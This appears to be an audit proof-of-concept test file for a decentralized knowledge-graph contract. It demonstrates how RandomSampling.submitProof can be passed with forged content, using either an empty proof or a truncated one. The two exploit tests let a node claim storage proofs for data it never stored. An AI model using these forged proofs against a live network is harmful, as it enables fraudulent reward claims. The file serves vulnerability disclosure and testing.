import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from 'chai';
import { ethers } from 'ethers';
import hre from 'hardhat';

import {
  RandomSampling,
  RandomSamplingStorage,
  Chronos,
  DKGKnowledgeAssets,
  Profile,
  Hub,
  ShardingTable,
  ContextGraphStorage,
  ContextGraphValueStorage,
  CGWeightTreeStorage,
} from '../../typechain';
import { createProfile } from '../helpers/profile-helpers';

/**
 * ============================================================================
 * PoC for AUDIT FINDING F-01 (CRITICAL) — total proof-of-storage bypass.
 * ============================================================================
 *
 * `RandomSampling.submitProof` derives `leaf = keccak256(content)` over fully
 * attacker-controlled `bytes content` (no shape/length check) and verifies it
 * with `_verifyV10MerkleProof`, which:
 *   (a) folds exactly `merkleProof.length` siblings and NEVER requires
 *       `merkleProof.length == ceil(log2(leafCount))` (no proof-depth binding), and
 *   (b) hashes leaves and internal nodes with the SAME plain keccak256
 *       (no domain separation: leaf = keccak256(content); node = keccak256(l||r)).
 *
 * Because the committed KA root for a public CG is the STRUCTURED root
 *   R = keccak256(publicRoot || SENTINEL_NO_PRIVATE),
 * and `publicRoot` + `SENTINEL_NO_PRIVATE` are both public / network-reconstructible,
 * an attacker can submit `content = (publicRoot || SENTINEL)` with an EMPTY proof.
 * Then `keccak256(content) == R`, the verifier returns `R == R`, and the node is
 * credited a valid storage proof WITHOUT ever holding the actual chunk bytes.
 *
 * The in-source comment at submitProof (the "content-binding empty-proof fix")
 * claims this is prevented because "no real triple's keccak256 equals a stored
 * 32-byte root (preimage resistance)". That is true for a *real triple* — but the
 * attacker does not submit a triple; it submits the root's KNOWN 64-byte preimage
 * (publicRoot || SENTINEL). Preimage resistance does not help when the preimage is
 * public. This test demonstrates the bypass end-to-end on the real verifier.
 */
describe('@integration PoC F-01: RandomSampling proof-of-storage bypass', () => {
  // ── structured single-leaf public KA (matches V10 merkle / seam test) ──
  const SENTINEL_NO_PRIVATE = ethers.keccak256(
    ethers.toUtf8Bytes('DKG_NO_PRIVATE_DATA_V10'),
  );
  // The ACTUAL chunk bytes an honest node must STORE to prove chunk 0.
  const publicContent = ethers.toUtf8Bytes('f01-secret-chunk-content');
  const publicRoot = ethers.keccak256(publicContent); // 1-leaf tree: root == leaf
  const merkleRoot = ethers.keccak256(
    ethers.concat([publicRoot, SENTINEL_NO_PRIVATE]),
  ); // structured KA root = hashPair(publicRoot, privateDataHash)
  const honestProof = [SENTINEL_NO_PRIVATE];

  // The FORGED content: the root's public 64-byte preimage. Built ONLY from
  // `publicRoot` (a public hash any peer can recompute) and the public SENTINEL
  // constant — it deliberately does NOT contain `publicContent`.
  const forgedEmptyProofContent = ethers.concat([publicRoot, SENTINEL_NO_PRIVATE]);

  const OPEN_POLICY = 1;
  const TEST_KA_BYTE_SIZE = 128n;

  let accounts: Awaited<ReturnType<typeof hre.ethers.getSigners>>;
  let opSigner: (typeof accounts)[number];
  let Hub: Hub;
  let RandomSampling: RandomSampling;
  let RandomSamplingStorage: RandomSamplingStorage;
  let Chronos: Chronos;
  let DKGKnowledgeAssets: DKGKnowledgeAssets;
  let Profile: Profile;
  let ShardingTable: ShardingTable;
  let ContextGraphStorage: ContextGraphStorage;
  let ContextGraphValueStorage: ContextGraphValueStorage;
  let CGWeightTreeStorage: CGWeightTreeStorage;
  let kaNumber = 0n;

  async function deployFixture() {
    await hre.deployments.fixture([
      'Token', 'Hub', 'ParametersStorage', 'WhitelistStorage', 'IdentityStorage',
      'ShardingTableStorage', 'ShardingTable', 'StakingStorage', 'ProfileStorage',
      'Chronos', 'EpochStorage', 'DKGKnowledgeAssets', 'AskStorage', 'DelegatorsInfo',
      'RandomSamplingStorage', 'ContextGraphValueStorage', 'ContextGraphStorage',
      'RandomSampling', 'Profile',
    ]);
    accounts = await hre.ethers.getSigners();
    Hub = await hre.ethers.getContract<Hub>('Hub');
    await Hub.setContractAddress('HubOwner', accounts[0].address);
    await Hub.setContractAddress('TestStorageOperator', accounts[19].address);

    RandomSampling = await hre.ethers.getContract<RandomSampling>('RandomSampling');
    RandomSamplingStorage = await hre.ethers.getContract<RandomSamplingStorage>('RandomSamplingStorage');
    Chronos = await hre.ethers.getContract<Chronos>('Chronos');
    DKGKnowledgeAssets = await hre.ethers.getContract<DKGKnowledgeAssets>('DKGKnowledgeAssets');
    Profile = await hre.ethers.getContract<Profile>('Profile');
    ShardingTable = await hre.ethers.getContract<ShardingTable>('ShardingTable');
    ContextGraphStorage = await hre.ethers.getContract<ContextGraphStorage>('ContextGraphStorage');
    ContextGraphValueStorage = await hre.ethers.getContract<ContextGraphValueStorage>('ContextGraphValueStorage');
    CGWeightTreeStorage = await hre.ethers.getContract<CGWeightTreeStorage>('CGWeightTreeStorage');
    await CGWeightTreeStorage.connect(accounts[19]).finishBackfill();
    opSigner = accounts[19];
    kaNumber = 0n;
  }

  function nextKaId(): bigint {
    kaNumber += 1n;
    return (BigInt(opSigner.address) << 96n) | kaNumber;
  }

  async function createPublicCG(): Promise<bigint> {
    await (
      await ContextGraphStorage.connect(opSigner).createContextGraph(
        accounts[1].address, [], 0, 0, OPEN_POLICY, ethers.ZeroAddress, 0, ethers.ZeroHash,
      )
    ).wait();
    return ContextGraphStorage.getLatestContextGraphId();
  }

  async function seedKa(cgId: bigint, root: string, leafCount: number): Promise<bigint> {
    const currentEpoch = await Chronos.getCurrentEpoch();
    const receipt = await (
      await DKGKnowledgeAssets.connect(opSigner).createKnowledgeAsset(
        opSigner.address, opSigner.address, nextKaId(), 'f01-poc',
        root, 1, TEST_KA_BYTE_SIZE, currentEpoch, currentEpoch + 5n, 0, false, leafCount,
      )
    ).wait();
    const iface = DKGKnowledgeAssets.interface;
    const topic = iface.getEvent('KnowledgeAssetCreated')!.topicHash;
    const log = receipt!.logs.find((l) => l.topics[0] === topic)!;
    const kaId = iface.parseLog(log as unknown as { topics: string[]; data: string })!.args[0] as bigint;
    await (await ContextGraphStorage.connect(opSigner).registerKnowledgeAssetToContextGraph(cgId, kaId)).wait();
    await (await ContextGraphValueStorage.connect(opSigner).addCGValueForEpochRange(cgId, currentEpoch, 5n, 1_000n)).wait();
    await (await CGWeightTreeStorage.connect(opSigner).settle(cgId)).wait();
    return kaId;
  }

  async function setupChallengingNode() {
    const node = { operational: accounts[2], admin: accounts[1] };
    const { identityId } = await createProfile(Profile, node);
    // @ts-expect-error – direct insertNode for test setup (owner bypasses onlyContracts)
    await ShardingTable.connect(accounts[0]).insertNode(identityId);
    return { ...node, identityId };
  }

  // Drive the REAL createChallenge path against a single-leaf public KA committed with `merkleRoot`.
  async function realChallenge() {
    const cgId = await createPublicCG();
    const kaId = await seedKa(cgId, merkleRoot, 1);
    const node = await setupChallengingNode();
    await RandomSampling.updateAndGetActiveProofPeriodStartBlock();
    await RandomSampling.connect(node.operational).createChallenge();
    const challenge = await RandomSamplingStorage.getNodeChallenge(node.identityId);
    return { node, kaId, challenge };
  }

  beforeEach(async () => {
    hre.helpers.resetDeploymentsJson();
    await loadFixture(deployFixture);
  });

  // ────────────────────────────────────────────────────────────────────────
  // CONTROL 1 — the verifier ACCEPTS a genuine, full-length proof.
  // (Establishes the harness is wired correctly and proofs are actually checked.)
  // ────────────────────────────────────────────────────────────────────────
  it('CONTROL: an honest proof (real chunk content + sibling) verifies', async () => {
    const { node, challenge } = await realChallenge();
    expect(challenge.solved).to.equal(false);
    expect(challenge.chunkId).to.equal(0n);
    expect(challenge.challengeRoot).to.equal(merkleRoot);

    await RandomSampling.connect(node.operational).submitProof(publicContent, honestProof);
    expect((await RandomSamplingStorage.getNodeChallenge(node.identityId)).solved).to.equal(true);
  });

  // ────────────────────────────────────────────────────────────────────────
  // CONTROL 2 — the verifier REJECTS a genuinely wrong proof.
  // (Shows acceptance below is meaningful, not "accepts everything".)
  // ────────────────────────────────────────────────────────────────────────
  it('CONTROL: a genuinely wrong proof is rejected', async () => {
    const { node } = await realChallenge();
    const wrongContent = ethers.toUtf8Bytes('content the node does not have');
    const wrongProof = [ethers.keccak256(ethers.toUtf8Bytes('garbage-sibling'))];
    await expect(
      RandomSampling.connect(node.operational).submitProof(wrongContent, wrongProof),
    ).to.be.revertedWithCustomError(RandomSampling, 'MerkleRootMismatchError');
  });

  // ────────────────────────────────────────────────────────────────────────
  // EXPLOIT 1 (headline) — EMPTY-PROOF BYPASS via the real createChallenge path.
  // The node passes the challenge submitting ONLY the root's public 64-byte
  // preimage (publicRoot || SENTINEL) and an EMPTY proof — it never holds, and
  // never submits, the actual chunk content `publicContent`. chunkId-independent.
  // ────────────────────────────────────────────────────────────────────────
  it('EXPLOIT: empty proof + public root-preimage passes WITHOUT the stored data', async () => {
    const { node, challenge } = await realChallenge();
    const epoch = await Chronos.getCurrentEpoch();

    // Sanity: the forged content is NOT the real chunk, yet hashes to the pinned root.
    expect(ethers.hexlify(forgedEmptyProofContent)).to.not.equal(ethers.hexlify(publicContent));
    expect(ethers.keccak256(forgedEmptyProofContent)).to.equal(challenge.challengeRoot);

    // The exploit: empty proof, content = (publicRoot || SENTINEL).
    await RandomSampling.connect(node.operational).submitProof(forgedEmptyProofContent, []);

    const after = await RandomSamplingStorage.getNodeChallenge(node.identityId);
    expect(after.solved).to.equal(true); // challenge marked solved
    expect(
      await RandomSamplingStorage.getEpochNodeValidProofsCount(epoch, node.identityId),
    ).to.equal(1n); // network credits a VALID storage proof for data never stored
  });

  // ────────────────────────────────────────────────────────────────────────
  // EXPLOIT 2 — TRUNCATED proof with a FORGED INTERNAL NODE as the "leaf".
  // Demonstrates the missing depth-binding + domain separation directly: an
  // honest chunk-0 proof in a 2-leaf public tree has length 2 ([PL1, SENTINEL]);
  // the attacker passes with length 1 by presenting an internal node value as a
  // leaf (content = PL0||PL1 ⇒ keccak256(content) == publicRoot). The challenge
  // is injected via the owner-only setNodeChallenge purely to PIN chunkId=0 for a
  // deterministic multi-leaf demo (createChallenge pins the identical fields; the
  // empty-proof exploit above already proves full reachability).
  // ────────────────────────────────────────────────────────────────────────
  it('EXPLOIT: truncated proof with a forged internal-node leaf passes (no depth binding)', async () => {
    const content0 = ethers.toUtf8Bytes('2leaf-chunk-0');
    const content1 = ethers.toUtf8Bytes('2leaf-chunk-1');
    const PL0 = ethers.keccak256(content0);
    const PL1 = ethers.keccak256(content1);
    const publicRoot2 = ethers.keccak256(ethers.concat([PL0, PL1]));
    const R2 = ethers.keccak256(ethers.concat([publicRoot2, SENTINEL_NO_PRIVATE]));

    // Honest chunk-0 proof would be length 2: [PL1, SENTINEL]. Forged is length 1.
    const forgedContent = ethers.concat([PL0, PL1]); // keccak256 == publicRoot2 (an internal node)
    const forgedProof = [SENTINEL_NO_PRIVATE];

    const node = await setupChallengingNode();
    await RandomSampling.updateAndGetActiveProofPeriodStartBlock();
    const status = await RandomSampling.getActiveProofPeriodStatus();
    const duration = await RandomSampling.getActiveProofingPeriodDurationInBlocks();
    const epoch = await Chronos.getCurrentEpoch();

    // Inject a public challenge pinned to (root=R2, leafCount=2, chunkId=0).
    const injected = [
      1n,                                       // knowledgeAssetId (not re-read by submitProof)
      0n,                                       // chunkId (pinned even)
      await DKGKnowledgeAssets.getAddress(),    // knowledgeAssetStorageContract
      epoch,                                    // epoch
      status.activeProofPeriodStartBlock,       // activeProofPeriodStartBlock (must match)
      duration,                                 // proofingPeriodDurationInBlocks
      false,                                    // solved
      false,                                    // isCurated (public path)
      2,                                        // challengeLeafCount
      R2,                                       // challengeRoot
    ];
    await RandomSamplingStorage.connect(opSigner).setNodeChallenge(node.identityId, injected as never);

    await RandomSampling.connect(node.operational).submitProof(forgedContent, forgedProof);
    expect((await RandomSamplingStorage.getNodeChallenge(node.identityId)).solved).to.equal(true);
  });
});
